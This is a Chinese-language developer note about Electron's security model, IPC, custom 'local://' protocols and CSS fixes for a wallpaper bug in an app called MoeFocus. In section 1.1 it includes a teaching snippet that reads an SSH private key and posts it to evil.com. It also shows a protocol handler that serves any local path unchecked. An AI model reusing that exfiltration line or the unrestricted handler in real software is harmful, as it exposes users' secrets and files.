# 04 — Electron 安全模型与自定义协议：壁纸为何不显示

## 问题现象

在设置中选择自定义壁纸后，应用背景和日记页大图都无法显示所选图片。

## 一、前置知识

### 1.1 Electron 双进程架构的深层原因

在第 01 号文档中我们介绍了 Electron 有两个进程。这里深入解释**为什么**要这样设计。

```
┌──────────────────────────────────────────────────────────┐
│                     Electron 应用                         │
│                                                          │
│  ┌────────────────────┐      IPC       ┌───────────────┐ │
│  │   Renderer Process │  ←─────────→   │  Main Process │ │
│  │                    │                │               │ │
│  │  沙盒环境           │   contextBridge │  完整 Node.js │ │
│  │  • 不能 fs 操作     │   ↓ 白名单API   │  • fs 读写    │ │
│  │  • 不能 child_proc │                │  • 系统命令    │ │
│  │  • 不能 require()  │  安全的管道     │  • 原生模块    │ │
│  │  • 可以用 Web API  │                │  • OS 级别API │ │
│  └────────────────────┘                └───────────────┘ │
│         ↑                                                  │
│    Chromium 的沙盒机制                                     │
│    (和 Chrome 浏览器的安全模型一样)                          │
└──────────────────────────────────────────────────────────┘
```

**如果不做这个隔离会发生什么？**

想象一个场景：你的 Electron 应用有一个 `<webview>` 或者 `iframe` 加载了第三方网页。如果渲染进程可以直接 `require('fs')`，那个网页的 JavaScript 代码可以做：

```javascript
// 恶意代码示例（仅用于教学说明）
const fs = require('fs')
const files = fs.readdirSync('C:\\Users\\')         // 列目录
const secrets = fs.readFileSync('.ssh/id_rsa', ...) // 读密钥
fetch('https://evil.com/steal', { body: secrets })   // 上传到黑客服务器
```

这就是**最小权限原则**（Principle of Least Privilege）：每个程序组件只应该拥有它完成本职工作所必需的权限，一分不多。

> **经典源码学习**：Chromium 的沙盒实现是操作系统级别安全的典范。在 Windows 上，它使用 Restricted Tokens 和 Job Objects；在 Linux/macOS 上，使用 setuid sandbox + 命名空间隔离。关键源码见 Chromium 的 `//sandbox/` 目录，其中 `sandbox/win/src/restricted_token.cc` 展示了如何使用 Windows API 创建受限的进程令牌。

### 1.2 Electron 的 IPC：contextBridge + ipcMain.handle

IPC 的通信用了两个关键 API：

**渲染进程侧**（`preload.ts`）：

```typescript
// preload.ts — 运行在渲染进程中，但在网页脚本加载之前
// 它通过 contextBridge 把主进程的能力"安全地"暴露给网页

import { contextBridge, ipcRenderer } from 'electron'

contextBridge.exposeInMainWorld('electronAPI', {
  // 网页中可以通过 window.electronAPI.file.getWallpaper() 调用
  file: {
    get_wallpaper: () => ipcRenderer.invoke('file:getWallpaper'),
    pick_image:   () => ipcRenderer.invoke('file:pickImage'),
  }
})
```

`contextBridge` 的关键特性：
- 网页中的 JS 代码**不能**直接访问 `ipcRenderer` — 这是安全的保证
- 网页中的 JS 代码**只能**调用 `window.electronAPI` 中白名单列出的方法
- `contextBridge` 在网页加载之前运行，预先把 API 注入到 `window` 对象

**主进程侧**（`ipc/index.ts`）：

```typescript
// ipc/index.ts — 运行在主进程中
// 用 ipcMain.handle 注册处理器

import { ipcMain } from 'electron'

ipcMain.handle('file:getWallpaper', async () => {
  // 这里可以安全地调用 fs.readFile, 操作数据库等
  const row = db.get('SELECT file_path FROM wallpapers WHERE is_active = 1')
  return row?.file_path ?? null
})
```

**完整的调用链路**：

```
网页 JS:
  const path = await window.electronAPI.file.get_wallpaper()
       │
       │  preload.ts 中的 contextBridge 代理
       ▼
  ipcRenderer.invoke('file:getWallpaper')
       │
       │  Electron 内核的 IPC 通道（经过序列化/反序列化）
       ▼
  ipcMain.handle('file:getWallpaper', handler)
       │
       │  主进程中的 Node.js 代码
       ▼
  db.get('SELECT ...')
       │
       │  返回结果，沿原路返回
       ▼
  path = 'C:\\Users\\...\\wallpaper.png'
```

> **经典源码学习**：Electron 的 IPC 底层基于 Chromium 的 Mojo IPC 框架。Mojo 是 Chromium 团队开发的跨平台 IPC 系统，支持消息传递、共享内存和远程过程调用。相关源码在 Chromium 的 `//mojo/` 目录。Electron 在 `//electron/shell/common/api/` 中对 Mojo 做了封装，暴露为 `ipcRenderer` / `ipcMain` API。

### 1.3 自定义协议（Custom Protocol）：替代 file://

渲染进程中不能直接用 `file://` 协议加载本地图片（因为 CSP — 内容安全策略会阻止）。

Electron 提供了**自定义协议**机制：你可以注册一个自己的协议（如 `local://`），当渲染进程用这个协议请求资源时，主进程拦截请求并返回本地文件内容。

```
<!-- 渲染进程的 HTML -->
<img src="local://C:/Users/xxx/wallpaper.png" />
        │
        │  Electron 的协议处理层拦截
        ▼
主进程 protocol.handle('local', (request) => {
  const file_path = request.url.replace('local://', '')
  return net.fetch(pathToFileURL(file_path).href)
})
        │
        ▼
返回图片的二进制数据给 <img> 标签
```

**Electron 28 的 API 迁移**：

旧 API（已弃用）：
```typescript
protocol.registerFileProtocol('local', (request, callback) => {
  callback({ path: decoded_path })
})
```

新 API（推荐）：
```typescript
protocol.handle('local', (request) => {
  const raw = decodeURIComponent(request.url.replace('local://', '').replace(/^\/+/, ''))
  // pathToFileURL 正确处理中文路径等非 ASCII 字符
  return net.fetch(pathToFileURL(raw).href)
})
```

新 API 返回标准的 Web `Response` 对象，与 Fetch API 一致，更符合 Web 标准。

### 1.4 CSS background 简写属性的内部机制

CSS 的 `background` 是一个**简写属性（Shorthand Property）**。它一次性设置 8 个子属性：

```css
/* 这个简写：*/
background: url('bg.png') center / cover no-repeat fixed border-box content-box red;

/* 等价于同时设置这 8 个子属性：*/
background-image:      url('bg.png')
background-position:   center
background-size:       cover
background-repeat:     no-repeat
background-attachment: fixed
background-origin:     border-box
background-clip:       content-box
background-color:      red
```

**关键陷阱：简写会重置所有没有显式指定的子属性为默认值**。

```css
/* ❌ 错误写法 */
.element {
  background-size: cover;         /* 第1行：设为 cover */
  background-position: center;    /* 第2行：设为 center */
  background: linear-gradient(135deg, #1a1a2e, #16213e); /* 第3行 */
  /* └── 这行重置了上面的所有设置！
        background-size → auto (默认值)
        background-position → 0% 0% (默认值)
        background-repeat → repeat (默认值) */
}

/* ✓ 正确写法 */
.element {
  background-image: linear-gradient(135deg, #1a1a2e, #16213e);
  background-size: cover;
  background-position: center;
  background-repeat: no-repeat;
}
```

**为什么 React 内联样式也可能被覆盖？**

React 组件的内联 `style={{ backgroundImage: url(...) }}` 在 DOM 上的优先级很高，但它设置的也是 `background-image` 子属性。如果 CSS 类中稍后使用了 `background` 简写，内联的 `backgroundImage` 会被简写的默认值覆盖。

> **经典源码学习**：浏览器的 CSS 属性解析引擎负责处理简写属性和长写属性的关系。Chromium 的相关实现见 `//third_party/blink/renderer/core/css/`，其中 `css_properties.json5` 是一个超大 JSON 文件，定义了每个 CSS 属性的类型、默认值、是否是简写、简写包含哪些子属性等元数据。

### 1.5 Fallback（降级）模式

在软件工程中，fallback 是保证鲁棒性的核心策略：

```
首选方案 A
  → 失败？尝试备用方案 B
  → 失败？尝试备用方案 C
  → 失败？使用硬编码默认值（兜底）
```

MoeFocus 中壁纸路径有两个来源：

```
首选：wallpapers 表（is_active = 1 的行）    ← 主要的壁纸管理方式
降级：settings 表中的 ui.active_wallpaper    ← 历史遗留的备用路径
兜底：默认壁纸（wallpapers/ 目录按页面名匹配）  ← 用户没设置壁纸时的最后防线
```

这种"层层降级"的设计让系统在部分环节出问题时仍能正常运行。

---

## 二、根因分析

### 问题 1：CSS 简写覆盖

`AnimeBackground.module.css` 中 `background` 简写在 `background-size` 等设置之**后**声明，把它们全重置了。

### 问题 2：过时的 protocol API

旧代码使用已弃用的 `protocol.registerFileProtocol`，在新版 Electron 中路径处理不一致。

### 问题 3：壁纸加载缺少多源 fallback

壁纸只在 `settings` 表读，没有 fallback 到 `wallpapers` 表。

---

## 三、修复方案

### 1. CSS：background-image 替代 background 简写

```css
/* 只用长写属性，互不干扰 */
.background {
  background-image: linear-gradient(135deg, #1a1a2e, #16213e);
  background-size: cover;
  background-position: center;
  background-repeat: no-repeat;
}
```

### 2. 升级 protocol API

```typescript
// main.ts
protocol.handle('local', (request) =>
{
  const raw = decodeURIComponent(request.url.replace('local://', '').replace(/^\/+/, ''))
  return net.fetch(pathToFileURL(raw).href)
})
```

### 3. 多重 fallback 加载逻辑

```typescript
async function load_wallpaper(): Promise<string | null>
{
  // 首选：wallpapers 表
  const active = await window.electronAPI.file.get_active_wallpaper()
  if (active) return active

  // 降级：settings 表
  const legacy = await window.electronAPI.settings.get('ui.active_wallpaper')
  if (legacy) return legacy

  // 兜底：null → 使用默认壁纸
  return null
}
```

---

## 四、知识点总结

| 知识点 | 一句话总结 |
|--------|-----------|
| Electron 安全模型 | 双进程 + contextBridge 白名单 = 最小权限原则 |
| IPC 调用链路 | preload → invoke → handle → 主进程逻辑 → 返回 |
| 自定义协议 | `protocol.handle` 让主进程以可控方式暴露本地文件 |
| CSS 简写陷阱 | `background` 简写重置所有子属性，用长写属性更安全 |
| Fallback 链 | 首选 → 降级 → 兜底，系统在任何情况下都不崩溃 |

---

## 涉及文件

| 文件 | 变更 |
|------|------|
| `moefocus/src/components/layout/AnimeBackground.module.css` | 修复 CSS 简写 |
| `moefocus/src/components/layout/AnimeBackground.tsx` | 重构加载逻辑，增加 fallback |
| `moefocus/electron/main.ts` | protocol.handle 替代 registerFileProtocol |
| `moefocus/electron/ipc/index.ts` | 新增 file:getActiveWallpaper handler |
| `moefocus/electron/preload.ts` | 暴露新 API |
